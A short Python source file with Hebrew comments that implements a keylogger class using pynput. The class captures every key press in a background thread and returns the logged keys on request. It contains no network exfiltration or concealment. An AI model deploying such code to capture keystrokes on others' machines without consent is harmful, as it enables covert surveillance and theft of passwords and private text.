from pynput import keyboard
from ikeyLogger import IKeyLogger
from typing import List
import threading
import time


class KeyLogger(IKeyLogger):

    def __init__(self):
        self.pressed_keys = {}   # מילון לעקוב אחרי מצב המקשים
        self.keys = []
        self.listener = None

    def on_press(self, key):
        # אם המקש לא היה לחוץ קודם, נדפיס ונעדכן את המצב
        if key not in self.pressed_keys or not self.pressed_keys[key]:
            self.pressed_keys[key] = True
            try:
                self.keys.append(key.char)
            except AttributeError:
                self.keys.append(str(key)[4:])

    def on_release(self, key):
        # בעזיבה, נעדכן את המצב ונדפיס
        self.pressed_keys[key] = False

    def listen(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            self.listener = listener
            listener.join()

    def start_logging(self) -> None:
        # יצירת thread חדש והתחלה של ההאזנה
        threading.Thread(target=self.listen).start()
        time.sleep(5)  # מתן זמן ל-Listener לפעול

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        keys = self.keys
        self.keys = []
        return keys


if __name__ == '__main__':
    system_test = KeyLogger()
    system_test.start_logging()
    system_test.stop_logging()
    print(system_test.get_logged_keys())